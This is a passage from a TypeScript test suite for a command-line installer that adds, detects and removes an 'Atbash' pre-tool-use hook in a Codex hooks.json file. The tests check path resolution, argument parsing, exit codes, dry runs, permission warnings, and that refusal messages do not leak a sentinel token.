      assert.doesNotMatch(quiet.stderr, /^warning:/m);
      chmodSync(dir, 0o777);
      assert.equal(directoryWritableByOthers(dir, process.platform), true);
      const loud = runCli(["--uninstall"], context(home));
      assert.equal(loud.code, EXIT_OK, loud.stderr);
      assert.match(loud.stderr, /^warning: .*writable by other users.*chmod 700/m);
      assert.equal(existsSync(join(dir, "hooks.json")), true, "a warning never refuses");
    }
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: scope and --dir resolve the documented paths without reading the file system", () => {
  const ctx = { cwd: "/work/project", env: {}, home: "/home/dev" };
  const expect = (parts: string[]) => resolve(...parts);
  assert.equal(
    resolveHooksPath("user", undefined, ctx),
    expect(["/home/dev", ".codex", "hooks.json"]),
  );
  assert.equal(
    resolveHooksPath("user", undefined, { ...ctx, env: { CODEX_HOME: "/srv/codex" } }),
    expect(["/srv/codex", "hooks.json"]),
  );
  assert.equal(
    resolveHooksPath("user", undefined, { ...ctx, env: { CODEX_HOME: "  " } }),
    expect(["/home/dev", ".codex", "hooks.json"]),
    "a blank CODEX_HOME is ignored",
  );
  assert.equal(
    resolveHooksPath("user", "/custom/home", { ...ctx, env: { CODEX_HOME: "/srv/codex" } }),
    expect(["/custom/home", "hooks.json"]),
    "--dir wins over CODEX_HOME",
  );
  assert.equal(
    resolveHooksPath("project", undefined, ctx),
    expect(["/work/project", ".codex", "hooks.json"]),
  );
  assert.equal(
    resolveHooksPath("project", "sub", ctx),
    expect(["/work/project", "sub", ".codex", "hooks.json"]),
    "a relative --dir is taken from cwd",
  );

  // Project scope on a real directory: <project>/.codex/hooks.json is created.
  const project = tempHome();
  try {
    const result = installHook(options({ scope: "project", dir: project }), context(project));
    assert.equal(result.action, "installed");
    assert.equal(result.hooksPath, join(project, ".codex", "hooks.json"));
    assert.ok(result.hooksPath.startsWith(project + sep));
    assertAtbashHook(readDocument(result.hooksPath).hooks?.PreToolUse?.[0]?.hooks?.[0]);
  } finally {
    rmSync(project, { force: true, recursive: true });
  }
});

test("install-hook: usage errors exit 2 and a missing hook script is refused with exit 1", () => {
  assert.deepEqual(parseArgs([]), {
    ok: true,
    options: { scope: "user", dryRun: false, uninstall: false, help: false },
  });
  assert.deepEqual(parseArgs(["--dry-run", "--uninstall", "--scope=project", "--dir", "x"]), {
    ok: true,
    options: { scope: "project", dir: "x", dryRun: true, uninstall: true, help: false },
  });
  for (const argv of [
    ["--bogus"],
    ["--scope"],
    ["--scope", "global"],
    ["--dir"],
    ["--dir", "--dry-run"],
    ["--dir", "a", "--dir", "b"],
    ["extra"],
  ]) {
    const parsed = parseArgs(argv);
    assert.equal(parsed.ok, false, argv.join(" "));
    const result = runCli(argv, context(tmpdir()));
    assert.equal(result.code, EXIT_USAGE, argv.join(" "));
    assert.match(result.stderr, /Usage: node install-hook\.cjs/);
  }
  const help = runCli(["--help"], context(tmpdir()));
  assert.equal(help.code, EXIT_OK);
  assert.match(help.stdout, /--uninstall/);

  const home = tempHome();
  try {
    const result = runCli([], context(home, { runtimeDir: home }));
    assert.equal(result.code, EXIT_REFUSED);
    assert.match(result.stderr, /No pre-tool-use\.cjs next to this installer/);
    assert.equal(existsSync(join(home, ".codex")), false);
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: the built installer (dist and the committed runtime) registers its own sibling hook", () => {
  for (const entry of ["dist/install-hook.cjs", "runtime/install-hook.cjs"]) {
    const home = tempHome();
    try {
      const sibling = realpathSync(join(resolve(entry, ".."), "pre-tool-use.cjs"));
      const registered = WIN32 ? sibling.replaceAll("\\", "/") : sibling;
      const run = (args: string[]) =>
        spawnSync(process.execPath, [entry, ...args], {
          cwd: process.cwd(),
          encoding: "utf8",
          // The child must not see the real home: every path is pinned by --dir.
          env: {
            ...process.env,
            CODEX_HOME: join(home, "must-not-be-used"),
            HOME: home,
            USERPROFILE: home,
          },
        });

      const install = run(["--dir", home]);
      assert.equal(install.status, EXIT_OK, install.stderr);
      assert.match(install.stdout, /Installed the Atbash hook/, install.stdout);
      assert.match(install.stdout, /run \/hooks and trust/, install.stdout);
      const expectedCommand = `"${NODE_COMMAND}" "${registered}"`;
      assert.ok(install.stdout.includes(`hook command: ${expectedCommand}`), install.stdout);
      assert.ok(install.stdout.includes(`interpreter:  ${NODE_PATH}`), install.stdout);
      const hooksPath = join(home, "hooks.json");
      const document = readDocument(hooksPath);
      const hook = document.hooks?.PreToolUse?.[0]?.hooks?.[0];
      assert.ok(hook);
      assert.equal(hook.command, expectedCommand, entry);
      assert.equal(realpathSync(parseHookCommand(hook.command)?.interpreter ?? ""), NODE_PATH);
      assert.equal(hook.timeout, HOOK_TIMEOUT_SECONDS);
      assert.equal(realpathSync(commandScriptPath(hook.command) ?? ""), sibling, "round trip");
      assert.equal(
        existsSync(join(home, "must-not-be-used")),
        false,
        "CODEX_HOME was not consulted",
      );

      const again = run(["--dir", home]);
      assert.equal(again.status, EXIT_OK, again.stderr);
      assert.match(again.stdout, /already installed/);
      assert.equal(atbashGroups(readDocument(hooksPath)).length, 1);

      const dry = run(["--dry-run", "--uninstall", "--dir", home]);
      assert.equal(dry.status, EXIT_OK, dry.stderr);
      assert.match(dry.stdout, /Would remove/);
      assert.equal(atbashGroups(readDocument(hooksPath)).length, 1, "dry run wrote nothing");

      const uninstall = run(["--uninstall", "--dir", home]);
      assert.equal(uninstall.status, EXIT_OK, uninstall.stderr);
      assert.match(uninstall.stdout, /Removed the Atbash hook/);
      assert.equal(atbashGroups(readDocument(hooksPath)).length, 0);

      const usage = run(["--nope"]);
      assert.equal(usage.status, EXIT_USAGE);
      assert.match(usage.stderr, /Unknown argument: --nope/);

      writeFileSync(hooksPath, '{not json "tok_LEAK_CHILD"}');
      const refused = run(["--dir", home]);
      assert.equal(refused.status, EXIT_REFUSED);
      assert.match(refused.stderr, /^Refused: .*not valid JSON \(syntax error/);
      assert.equal(refused.stderr.includes("tok_LEAK_CHILD"), false, refused.stderr);
      assert.equal(readFileSync(hooksPath, "utf8"), '{not json "tok_LEAK_CHILD"}');
    } finally {
      rmSync(home, { force: true, recursive: true });
    }
  }
});
